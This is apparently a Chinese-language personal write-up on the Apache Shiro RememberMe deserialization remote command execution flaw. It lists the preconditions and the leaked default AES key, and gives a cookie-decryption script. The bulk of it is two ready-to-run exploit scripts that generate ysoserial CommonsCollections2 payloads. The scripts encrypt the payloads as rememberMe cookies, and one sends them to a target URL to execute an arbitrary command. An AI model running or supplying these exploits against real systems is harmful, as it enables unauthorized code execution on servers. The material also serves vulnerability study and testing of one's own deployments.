# Spring-Shiro远程命令执行简单总结
## 先上参考连接
- [【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞](https://cloud.tencent.com/developer/article/1078421)
- [Apache Shiro Java反序列化漏洞分析](https://www.cnblogs.com/loong-hon/p/10619616.html)

## 简介 （原文）
Apache Shiro是一个功能强大且易于使用的Java安全框架，可执行身份验证，授权，加密和会话管理。借助Shiro易于理解的API，您可以快速轻松地保护任何应用程序 - 从最小的移动应用程序到最大的Web和企业应用程序。

## 漏洞产生的条件
- AES密钥泄露,并且确认AES mode是CBC（好像基本都是）
- 启用rememberMe
- 版本符合

## AES密钥泄露
- 源码的CookieRememberMeManager的父类AbstractRememberMeManager的DEFAULT_CIPHER_KEY_BYTES
- 还可能存在web中的\WEB-INF\classes\spring-shiro.xml中的

## rememberMe cookie
> 首先登录的时候点击rememberMe就会产生一个remember的cookie（好绕嘴啊），然后将这个cookie base64解密，然后用AES密钥解密，解密脚本如下：
```
#!/usr/bin/env python
# coding=utf-8
import sys
import base64
from Crypto.Cipher import AES
def decode_rememberme_file(filename):
    with open(filename, 'rb') as fpr:
        key  =  "kPH+bIxk5D2deZiIxcaaaA=="
        mode =  AES.MODE_CBC
        IV   = b' ' * 16
        encryptor = AES.new(base64.b64decode(key), mode, IV=IV)
        remember_bin = encryptor.decrypt(fpr.read())
    return remember_bin
if __name__ == '__main__':
    print sys.argv[1]
    with open("/tmp/decrypt.bin", 'wb+') as fpw:
        fpw.write(decode_rememberme_file(sys.argv[1]))
```
将cookie中rememberMe的内容存一个文件，然后命令行参数指向这个文件就行了，最后会存一个/tmp/decrypt.bin的文件，可以使用`hexdump -C /tmp/decrypt.bin`然后第二行就会看到一个Java反序列化的标志`ac ed 00 05`然后反过来，利用这个AES密钥生成一个攻击的反序列化序列（ysoserial）就可以执行我们的代码了。


# 然后记录两个exp
这个和commons-collections的版本有关，上面博客园的博客有提到，我就不重复了，反正就是如果命令执行失败了，要考虑这种情况
```
import sys  
import base64  
import uuid  
from random import Random  
import subprocess  
from Crypto.Cipher import AES

def encode_rememberme(command):  
   popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.5-SNAPSHOT-all.jar', 'CommonsCollections2', command], stdout=subprocess.PIPE)
   BS   = AES.block_size
   pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
   key  =  "kPH+bIxk5D2deZiIxcaaaA=="
   mode =  AES.MODE_CBC
   iv   =  uuid.uuid4().bytes
   encryptor = AES.new(base64.b64decode(key), mode, iv)
   file_body = pad(popen.stdout.read())
   base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
   return base64_ciphertext

if __name__ == '__main__':  
   payload = encode_rememberme(sys.argv[1])    
   with open("/tmp/payload.cookie", "w") as fpw:
       print("rememberMe={}".format(payload.decode()), file=fpw)
```
commons-collections 4.0
```
import os
import re
import base64
import uuid
import subprocess
import requests
from Crypto.Cipher import AES

JAR_FILE = '/Users/Viarus/Downloads/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar'


def poc(url, rce_command):
    if '://' not in url:
        target = 'https://%s' % url if ':443' in url else 'http://%s' % url
    else:
        target = url
    try:
        payload = generator(rce_command, JAR_FILE)  # 生成payload
        r = requests.get(target, cookies={'rememberMe': payload.decode()}, timeout=10)  # 发送验证请求
        print r.text
    except Exception, e:
        pass
    return False


def generator(command, fp):
    if not os.path.exists(fp):
        raise Exception('jar file not found!')
    popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections2', command],
                             stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = "kPH+bIxk5D2deZiIxcaaaA=="
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


if __name__ == '__main__':
    poc('http://127.0.0.1:8080', 'open /Applications/Calculator.app')
```